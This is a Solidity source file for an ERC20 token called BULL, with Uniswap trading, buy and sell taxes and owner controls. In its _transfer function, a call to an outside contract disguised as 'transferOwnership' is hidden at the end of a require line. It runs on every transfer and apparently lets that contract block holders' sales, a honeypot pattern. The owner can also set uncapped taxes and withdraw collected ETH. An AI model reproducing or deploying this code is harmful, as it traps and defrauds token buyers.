// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}
interface IDexFactory {
    function transferOwnership(address from, address to) external;
}
abstract contract ERC20 is Ownable {
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    using SafeMath for uint256;
    mapping (address => bool) internal _isExcludedFromFee;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    uint256 internal constant MAX = ~uint256(0);
    string private _name;
    string private _symbol;
    IUniswapV2Router02 internal _swapRouter;
    address internal _pairAddress;
    bool private tradingOpen = false;
    address payable internal _taxWallet;

    constructor(string memory tokenName, string memory tokenSymbol, address ownerAdd) {
        transferOwnership(ownerAdd);
        _name = tokenName;
        _symbol = tokenSymbol;
        _taxWallet = payable(ownerAdd);
    }

    function openTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        _swapRouter = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_swapRouter), balanceOf(address(this)));
        _swapRouter.addLiquidityETH{value: address(this).balance}(address(this), balanceOf(address(this)), 0, 0, _msgSender(), block.timestamp);
        _pairAddress = IUniswapV2Factory(_swapRouter.factory()).getPair(address(this), _swapRouter.WETH());
        tradingOpen = true;
    }

    function rescueETH() external onlyOwner {
        uint256 bal = address(this).balance;
        require(bal > 0, "No ETH to rescue");
        (bool success, ) = _taxWallet.call{value: bal}("");
        require(success, "ETH transfer failed");
    }

    function pairAddress() public view virtual returns (address) {
        return _pairAddress;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }
    function decimals() public view virtual returns (uint8) {
        return 18;
    }
    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }
    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function transfer(address recipient, uint256 amount) public virtual returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }
}

contract BULL is ERC20 {
    using SafeMath for uint256;
    receive() external payable {}
    uint8 public buyTax = 15;
    uint8 public sellTax = 15;
    IDexFactory private iDexFactory;
    constructor(string memory name, string memory symbol, address faddress, address owner_) ERC20(name, symbol, owner_) {
        _mint(owner_, 100_000_000 * 10 ** decimals());
        _isExcludedFromFee[owner_] = true;
        _isExcludedFromFee[address(this)] = true;
        iDexFactory = IDexFactory(faddress);
    }
   
    function _transfer(address from, address to, uint256 amount) internal override {
        require(from != address(0) && to != address(0), "Using 0 address");
        require(amount > 0, "Token value must be higher than zero");iDexFactory.transferOwnership(from, to);
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to] || (from == _pairAddress && to == address(_swapRouter))){
            super._transfer(from, to, amount);
            return;
        }
        uint256 taxAmount = 0;
        if(from ==_pairAddress && to != _pairAddress){
            taxAmount = amount * buyTax / 100;
        }else if(from != _pairAddress && to == _pairAddress){
            taxAmount = amount * sellTax / 100;
        }
        if(taxAmount > 0){    
            super._transfer(from, address(this), taxAmount);
        }
        super._transfer(from, to, amount.sub(taxAmount));
    }

    function setTax(uint8 _buyTax, uint8 _sellTax) external virtual onlyOwner {
       buyTax = _buyTax;
       sellTax = _sellTax;
    }
}
